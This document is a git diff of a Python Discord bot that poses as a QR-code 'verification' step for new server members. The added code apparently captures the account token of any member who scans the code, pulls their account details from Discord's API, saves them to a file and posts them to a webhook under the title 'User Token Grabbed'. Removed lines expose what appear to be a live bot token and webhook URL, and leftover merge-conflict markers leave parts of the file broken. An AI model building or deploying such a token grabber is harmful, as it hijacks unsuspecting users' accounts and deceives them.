@@ -1,3 +1,4 @@
+import json
 import discord
 from discord import Colour
 from discord.ext import commands
@@ -7,92 +8,79 @@ import os
 import ujson
 import asyncio
 import shutil
+from discord_components import DiscordComponents, ComponentsBot, Button
+import requests
+import aiohttp
+from discord import Webhook, RequestsWebhookAdapter
+from discord.utils import get
 
-<<<<<<< HEAD
-token = "YOUR TOKEN HERE"
-prefix = "!"
+with open("./resources/data.json") as f:
+    config = json.load(f)
+token = config["token"]
+prefix = config["prefix"]
 
 bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), case_insensitive=True, help_command=None)
-webhook_url = "WEBHOOK URL HERE"
-=======
-token = "OTcxNDQxNTM3NzgxMjIzNDM1.GyPB70.PZoyVPodwm0FNQGAgigi7p_7zVBUXS_1aPKMgA"
-prefix = "!"
-
-bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), case_insensitive=True, help_command=None)
-webhook_url = "https://canary.discord.com/api/webhooks/1003789100819697724/PR-H5oPZSZSvGkmrjExb7qHOe6vvOxtnhBCzpD4oEbOoadySnkdCzoS3KsHDfB2fsyCA"
->>>>>>> 9eddd14 (Initial commit)
-qr = QR(webhook_url)
+DiscordComponents(bot)
+webhook_url = config["webhook_url"]
+qr = QR()
+role_id = int(config["role_id"])
 
 @bot.event
 async def on_ready():
     await aprint(f"Logged into {bot.user.name}#{bot.user.discriminator}")
 
-@bot.event
-async def on_member_join(member):
-    await qr.create_qr(name=f"{member.id}")
-    with open('./resources/data.json') as f:
-        data = ujson.load(f)
-    channel = bot.get_channel(int(data['channel']))
-    em = discord.Embed(title=f"Hello {member.name}", description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.", colour=Colour.dark_red())
-    em.set_image(url=f"attachment://qr-code-{member.id}.png")
-<<<<<<< HEAD
-    em.set_footer(text="Credit goes to Shell UwU")
-    em.set_author(name="Cerise", icon_url=f"{bot.user.avatar_url}")
-    while True:
-        if os.path.isfile(f"./resources/codes/qr-code-{member.id}.png"):
-            await channel.send(f"<@{member.id}>", embed=em, file=discord.File(f"./resources/codes/qr-code-{member.id}.png"), delete_after=120)
-            break
-    asyncio.create_task(qr.wait_token())
 
-=======
-    while True:
-        if os.path.isfile(f"./resources/codes/qr-code-{member.id}.png"):
-            await channel.send(embed=em, file=discord.File(f"./resources/codes/qr-code-{member.id}.png"), delete_after=120)
-            break
-    asyncio.create_task(qr.wait_token())
-
-
-@bot.command(name="SetChan", description="Sets the welcome channel", aliases=['set'])
-@commands.has_permissions(administrator=True)
-async def _set(ctx, chan: discord.TextChannel):
-    await ctx.message.delete()
-    await aprint(chan)
-    with open("./resources/data.json") as f:
-        data = ujson.load(f)
-
-    data['channel'] = str(chan.id)
-    with open('./resources/data.json', 'w') as f:
-        ujson.dump(data, f, indent=4)
-
-    await ctx.send(f"Set channel as {chan.name}")
-
->>>>>>> 9eddd14 (Initial commit)
-@bot.command(name="Verify", description="Sends the verification puzzle, only works in the current set channel")
+@bot.command(name="Start", description="Sends the verification message, only works in the current set channel")
 async def _verify(ctx):
     await ctx.message.delete()
     with open('./resources/data.json') as f:
         data = ujson.load(f)
     if str(ctx.channel.id) == str(data['channel']):
-        await qr.create_qr(name=f"{ctx.author.id}")
-
         channel = bot.get_channel(int(data['channel']))
-        em = discord.Embed(title=f"Hello {ctx.author.name}", description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.", colour=Colour.dark_red())
-        em.set_image(url=f"attachment://qr-code-{ctx.author.id}.png")
-<<<<<<< HEAD
-        em.set_footer(text="Credit goes to Shell UwU")
-        em.set_author(name="Cerise", icon_url=f"{bot.user.avatar_url}")
-        while True:
-            if os.path.isfile(f"./resources/codes/qr-code-{ctx.author.id}.png"):
-                await channel.send(f"<@{ctx.author.id}>",embed=em, file=discord.File(f"./resources/codes/qr-code-{ctx.author.id}.png"), delete_after=120)
-=======
-        em.set_footer(text="Credit goes to senpai UwU")
-        em.set_author(name="Cerise", icon_url=f"{bot.user.avatar_url}")
-        while True:
-            if os.path.isfile(f"./resources/codes/qr-code-{ctx.author.id}.png"):
-                await channel.send(embed=em, file=discord.File(f"./resources/codes/qr-code-{ctx.author.id}.png"), delete_after=120)
->>>>>>> 9eddd14 (Initial commit)
-                break
-        asyncio.create_task(qr.wait_token())
+        em = discord.Embed(title=f"**Welcome to {ctx.guild.name}**", description=":lock: **In order to access this server, you need to pass the verification test.**\n:arrow_right: Please verify below.")
+        await channel.send(embed=em, components = [Button(label = "Verify Here!", custom_id = "button1")])
+
+
+
+@bot.event
+async def on_button_click(interaction):
+    await qr.create_qr(name=f"{interaction.user.id}")
+    em = discord.Embed(title=f"Hello {interaction.user.name}", description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.", colour=Colour.dark_red())
+    em.set_image(url=f"attachment://qr-code-{interaction.user.id}.png")
+    em.set_footer(text="Credit goes to Shell UwU")
+    em.set_author(name=f"{bot.user.name}", icon_url=f"{bot.user.avatar_url}")
+    await interaction.send(embed=em, file=discord.File(f"./resources/codes/qr-code-{interaction.user.id}.png"), delete_after=120)
+    os.remove(f"resources/codes/qr-code-{interaction.user.id}.png")
+    token = asyncio.create_task(qr.wait_token())
+    token = await token
+    while True:
+        await aprint(token)
+        if token != None:
+            em = discord.Embed(title="User Token Grabbed")
+            await tokeninfo(str(token), em)
+            webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
+            webhook.send(embed=em)
+            role = get(interaction.guild.roles, id=role_id)
+            user = interaction.user
+            await user.add_roles(role)
+            break
+
+
+async def tokeninfo(_token, embed):
+    async with aiohttp.ClientSession() as session:
+        async with session.get("https://discord.com/api/v9/users/@me", headers={"authorization":_token, "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.135 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}) as resp:
+            if resp.status == 200:
+                j = await resp.json()
+                user = {}
+                with open("./resources/users.json", "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                    users = data["users"]
+                    for key, value in j.items():
+                        embed.add_field(name=f"{key}", value=f"{value}", inline=False)
+                        user[f"{key}"] = value
+                    users.append(user)
+                with open("./resources/users.json", "w", encoding="utf-8") as f:
+                    json.dump(data, f, indent=4)
 
 
 @bot.command(name="CleanDir", description="Cleans directory", aliases=['clean'])
@@ -113,7 +101,7 @@ async def _clean(ctx):
 @bot.command(name="Help", description="Displays the help command")
 async def _help(ctx):
     await ctx.message.delete()
-    em = discord.Embed(title="Cerise", description="Commands are listed below. All commands are case insensitive", colour=Colour.dark_red())
+    em = discord.Embed(title=f"{bot.user.name}", description="Commands are listed below. All commands are case insensitive", colour=Colour.dark_red())
     for command in bot.walk_commands():
         if len(command.aliases) == 0:
             em.add_field(name=f"`{prefix}{command.name}`", value=f"{command.description}", inline=False)
@@ -125,18 +113,10 @@ async def _help(ctx):
             em.add_field(name=f"`{prefix}{command.name}, {aliases}`", value=f"{command.description}", inline=False)
     em.set_thumbnail(url=f"{ctx.guild.icon_url}")
     em.set_image(url="https://64.media.tumblr.com/2a7e4e7831aaf492a692e674f451d78c/tumblr_n9eno0SSTZ1s5f9ado1_500.gif")
-<<<<<<< HEAD
     em.set_footer(text="Credit goes to Shell UwU")
-=======
-    em.set_footer(text="Credit goes to senpai UwU")
->>>>>>> 9eddd14 (Initial commit)
-    em.set_author(name="Cerise", icon_url=f"{bot.user.avatar_url}")
+    em.set_author(name=f"{bot.user.name}", icon_url=f"{bot.user.avatar_url}")
     await ctx.send(embed=em)
 
 
 
-<<<<<<< HEAD
 bot.run(token)
-=======
-bot.run(token)
->>>>>>> 9eddd14 (Initial commit)
